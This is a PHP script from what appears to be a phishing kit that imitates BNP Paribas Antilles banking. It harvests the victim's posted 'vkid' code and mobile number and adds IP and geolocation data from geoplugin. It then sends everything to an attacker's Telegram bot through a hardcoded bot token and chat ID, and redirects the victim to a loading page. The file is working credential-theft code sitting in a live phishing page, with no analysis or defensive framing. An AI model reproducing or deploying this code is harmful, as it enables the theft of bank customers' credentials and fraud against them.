<?php

include 'antibots.php';

/**$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}**/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State

$message = "";

$message .= "==========  Shyne BNP Antilles ==========\n";
$message .= "Code vkid : ".$_POST['vkid']."\n";
$message .= "Numéro Mobile : ".$_POST['p0']."\n";
$message .= "Country : ".$CNCD."\n";
$message .= "City : ".$STCD."\n";
$message .= "From : ".$ip."\n"; 
$message .= "==========  Shyne BNP Antilles  =========\n";

include './extra/extra.php';
/**$message = "";

while ([$key = key($_POST), $val = current($_POST)])
    
     {
           if(!empty($val)) {
                $message .= "$key : $val\n";
                
            }
            
        }**/

$telegram = new Telegram('7388648091:AAEAgu4i61E7Nnmj4WEuG_vdcUYa1C4EiTA');
$chat_id = 5123655130 ;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

 
 header('location: loading.php');
 
 ?>